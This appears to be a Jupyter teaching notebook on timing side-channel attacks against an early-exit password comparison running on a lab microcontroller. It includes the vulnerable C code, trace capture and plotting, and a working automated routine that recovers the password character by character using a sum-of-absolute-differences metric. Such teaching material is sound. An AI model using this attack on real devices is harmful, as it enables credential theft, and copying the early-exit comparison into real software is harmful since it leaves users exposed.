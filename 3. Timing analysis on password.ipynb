{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "# Timing analysis on password check"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Password check"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "```c\n",
    "uint8_t check_password(uint8_t cmd, uint8_t scmd, uint8_t len, uint8_t *input)\n",
    "{\n",
    "    trigger_high();\n",
    "\n",
    "    uint8_t password_correct = 1;\n",
    "    for (unsigned int i = 0; i < sizeof(stored_password) - 1; i++)\n",
    "    {\n",
    "        if (stored_password[i] != input[i])\n",
    "        {\n",
    "            password_correct = 0;\n",
    "            break;\n",
    "        }\n",
    "    }\n",
    "\n",
    "    trigger_low();\n",
    "\n",
    "    simpleserial_put(0x01, 1, &password_correct);\n",
    "    return 0;\n",
    "}\n",
    "\n",
    "int main(void)\n",
    "{\n",
    "    platform_init();\n",
    "    init_uart();\n",
    "    trigger_setup();\n",
    "\n",
    "    simpleserial_init();\n",
    "    simpleserial_addcmd(0x01, 0, check_password);\n",
    "    while (1)\n",
    "        simpleserial_get();\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Side note\n",
    "\n",
    "The code above is not only prone to timing analysis:\n",
    "- Initialization of `password_correct = 1` can be utilized in fault attacks.\n",
    "- Looping until `sizeof(stored_password) - 1` can cause out of bounds accesses on `input`."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Download and test"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [],
   "source": [
    "import securec\n",
    "import securec.util\n",
    "scope, target = securec.util.init()\n",
    "scope.default_setup()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [],
   "source": [
    "securec.util.compile_and_flash('./example_2.c')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [],
   "source": [
    "securec.util.reset_target()\n",
    "target.simpleserial_write(0x01, b'hello!')\n",
    "bytes(target.simpleserial_read(0x01))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [],
   "source": [
    "target.simpleserial_write(0x01, b'world')\n",
    "bytes(target.simpleserial_read(0x01))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Capturing traces"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "scope.default_setup()\n",
    "def capture(attempt):\n",
    "    scope.adc.samples = 500\n",
    "    scope.arm()\n",
    "    target.simpleserial_write(0x01, attempt.encode())\n",
    "    trace = securec.util.capture()\n",
    "    return trace, bool(target.simpleserial_read(0x01)[0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from bokeh.plotting import figure, show \n",
    "from bokeh.io import output_notebook\n",
    "from bokeh.models import CrosshairTool\n",
    "from bokeh.palettes import Category10_10\n",
    "\n",
    "output_notebook()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true,
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "trace, result = capture('hello world')\n",
    "p = figure(height=300, sizing_mode='stretch_width')\n",
    "p.add_tools(CrosshairTool())\n",
    "p.line(range(0, len(trace)), trace)\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Recording different attempts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "def plot_attempts(attempts):\n",
    "    data = []\n",
    "    for attempt in attempts:\n",
    "        data.append(capture(attempt))\n",
    "    p = figure(height=300, sizing_mode='stretch_width')\n",
    "    p.add_tools(CrosshairTool())\n",
    "    for idx, (attempt, (trace, result)) in enumerate(zip(attempts, data)):\n",
    "        p.line(range(0, len(trace)), trace - idx * 0.6, line_color=Category10_10[idx], legend_label=f'{attempt} -> {result}')\n",
    "    show(p)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "plot_attempts(['hello', 'world', 'ifx'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Exploit differences"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "def plot_difference(attempts):\n",
    "    data = []\n",
    "    for attempt in attempts:\n",
    "        data.append(capture(attempt)[0])\n",
    "    p = figure(height=300, sizing_mode='stretch_width', tooltips=[('data', '$name')])\n",
    "    p.add_tools(CrosshairTool())\n",
    "    ref_attempt = attempts[0]\n",
    "    ref_trace = data[0]\n",
    "    for idx, (attempt, trace) in enumerate(zip(attempts[1:], data[1:])):\n",
    "        p.line(\n",
    "            range(0, len(trace)), \n",
    "            abs(ref_trace - trace) - 0.6 * idx, \n",
    "            line_color=Category10_10[idx % 10], \n",
    "            legend_label=f'abs({ref_attempt} - {attempt})',\n",
    "            name=f'abs({ref_attempt} - {attempt})',\n",
    "        )\n",
    "    show(p)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "plot_difference(['hello', 'world', 'ifx'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "plot_difference(['hello'] + [f'i{n}' for n in 'abcdefghijklmnopqrstuvwxyz'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "# Next character?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Attack!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Define a quantity to highlight traces with more right characters.\n",
    "\n",
    "#### The sum of absolute differences\n",
    "\n",
    "Given two traces $t_1, t_2$ their SAD value is defined as:\n",
    "$$\\text{SAD}(t_1, t_2) := \\sum_i \\big| t_1[i] - t_2[i] \\big|,$$\n",
    "where $t[i]$ is the value of trace $t$ at point $i$."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [],
   "source": [
    "def sad(trace1, trace2):\n",
    "    return sum(abs(trace1 - trace2))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Automate attack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "def attack_password_sad(\n",
    "    sad_threshold=10,\n",
    "    charlist='abcdefghijklmnopqrstuvwxyz'\n",
    "):\n",
    "    result = False\n",
    "    password = ''\n",
    "\n",
    "    while not result or len(password) > 9:\n",
    "        basetrace, _ = capture(password)\n",
    "        for c in charlist:\n",
    "            trace, result = capture(password + c)\n",
    "            if sad(trace, basetrace) > sad_threshold:\n",
    "                password += c\n",
    "                print(f'success: \"{c}\" => password = {password}')\n",
    "                break\n",
    "        else:\n",
    "            print('no found')\n",
    "            break\n",
    "    return password, result"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "attack_password_sad()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Summary\n",
    "\n",
    "✓ Standard memory comparison (i.e. exit on first difference) is prone to timing attacks.\n",
    "\n",
    "✓ Sum of absolute differences can be used to identify traces with different run times."
   ]
  }
 ],
 "metadata": {
  "celltoolbar": "Slideshow",
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
